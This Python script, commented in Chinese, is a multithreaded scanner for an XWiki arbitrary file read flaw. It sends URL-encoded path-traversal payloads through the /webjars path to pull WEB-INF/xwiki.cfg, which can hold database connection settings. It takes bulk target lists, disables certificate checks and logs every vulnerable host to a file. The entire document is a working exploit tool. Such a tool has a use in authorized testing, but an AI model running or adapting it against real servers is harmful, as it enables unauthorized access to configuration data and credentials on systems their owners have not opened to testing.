import argparse
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import threading
# body="data-xwiki-reference"
# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

DEFAULT_PAYLOADS = [
    '/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg',
    '/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg',
    '/xwiki/webjars/wiki%3Axwiki/..%2F..%2FWEB-INF%2Fxwiki.cfg'
]

KEYWORDS = ('xwiki', 'xwiki.cfg', 'hibernate', 'jdbc', 'database')

lock = threading.Lock()

def normalize_target(u: str) -> str:
    u = u.strip()
    if not u:
        return ''
    parsed = urlparse(u)
    if not parsed.scheme:
        u = 'http://' + u
    return u.rstrip('/')

def make_session(retries=2, backoff=0.3):
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=backoff,
                  status_forcelist=(429, 500, 502, 503, 504),
                  allowed_methods=frozenset(['GET', 'HEAD']))
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    s.headers.update({
        'User-Agent': 'xwiki-poc-opt/1.0',
        'Accept': '*/*',
        'Connection': 'close'
    })
    return s

def check_payload(session, target, payload, timeout, host_header, verbose):
    url = target + (payload if payload.startswith('/') else '/' + payload)
    headers = {}
    if host_header:
        headers['Host'] = host_header
    try:
        r = session.get(url, timeout=timeout, verify=False, headers=headers)
    except requests.RequestException as e:
        if verbose:
            print(f"[WARN] 请求失败: {url} -> {e}")
        return None, f"request error: {e}"
    status = r.status_code
    length = len(r.content or b'')
    if status == 200:
        text = (r.text or '').lower()
        if any(k in text for k in KEYWORDS) or length > 200:  # 经验阈值，可调整
            return url, f"200 matched (len={length})"
        else:
            return url, f"200 no-keywords (len={length})"
    else:
        return None, f"{status} (len={length})"

def worker(target, payloads, timeout, host_header, out_file, verbose, results_set):
    session = make_session()
    for p in payloads:
        url_hit, msg = check_payload(session, target, p, timeout, host_header, verbose)
        if url_hit:
            with lock:
                if url_hit not in results_set:
                    results_set.add(url_hit)
                    print(f"[+]{target} 存在漏洞 -> {url_hit} ({msg})")
                    if out_file:
                        try:
                            with open(out_file, 'a', encoding='utf-8') as f:
                                f.write(f"{target} -> {url_hit}  # {msg}\n")
                        except Exception as e:
                            print(f"[!] 写入文件失败: {e}")
            # 如果命中第一个就停止尝试其它 payload（减少请求）
            return
        else:
            if verbose:
                print(f"[-]{target} {msg} (payload {p})")
    # 都未命中
    if not verbose:
        print(f"[-]{target} 未发现漏洞")

def load_targets_from_file(path):
    t = []
    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            s = line.strip()
            if s:
                n = normalize_target(s)
                if n:
                    t.append(n)
    return t

def parse_args():
    ap = argparse.ArgumentParser(description="xwiki 任意文件读取检测（增强版）")
    ap.add_argument('-u', '--url', dest='url', type=str, help="单个目标 URL")
    ap.add_argument('-f', '--file', dest='file', type=str, help="批量目标文件")
    ap.add_argument('-o', '--output', dest='output', type=str, default='result.txt', help="输出文件 (默认 result.txt)")
    ap.add_argument('-t', '--threads', dest='threads', type=int, default=20, help="并发线程数")
    ap.add_argument('--timeout', dest='timeout', type=float, default=8.0, help="请求超时（秒）")
    ap.add_argument('--payloads', dest='payloads', nargs='*', help="自定义 payload 列表（覆盖默认）")
    ap.add_argument('--host', dest='host', help="Host header（当用 IP 访问但服务绑定域名时使用）")
    ap.add_argument('-v', '--verbose', action='store_true', help="详细输出")
    return ap.parse_args()

def main():
    args = parse_args()
    targets = []
    if args.url and not args.file:
        n = normalize_target(args.url)
        if n:
            targets = [n]
    elif args.file and not args.url:
        try:
            targets = load_targets_from_file(args.file)
        except Exception as e:
            print(f"[!] 无法读取文件: {e}")
            sys.exit(1)
    else:
        print(f"Usage: python {sys.argv[0]} -u http://target 或 -f url.txt")
        sys.exit(1)

    if not targets:
        print("[!] 未找到有效目标")
        sys.exit(1)

    payloads = args.payloads if args.payloads else DEFAULT_PAYLOADS
    payloads = [p if p.startswith('/') else '/' + p for p in payloads]

    print(f"[*] 目标数: {len(targets)} 并发: {args.threads} 超时: {args.timeout}s payloads: {len(payloads)}")
    if args.host:
        print(f"[*] Host header: {args.host}")

    results_set = set()
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = [ex.submit(worker, t, payloads, args.timeout, args.host, args.output, args.verbose, results_set) for t in targets]
        try:
            for fut in as_completed(futures):
                fut.result()
        except KeyboardInterrupt:
            print("\n[!] 中断，取消任务")
            for f in futures:
                f.cancel()

    print(f"\n扫描完成，发现 {len(results_set)} 条（已写入 {args.output}）" if results_set else "\n扫描完成，未发现")

if __name__ == '__main__':
    main()
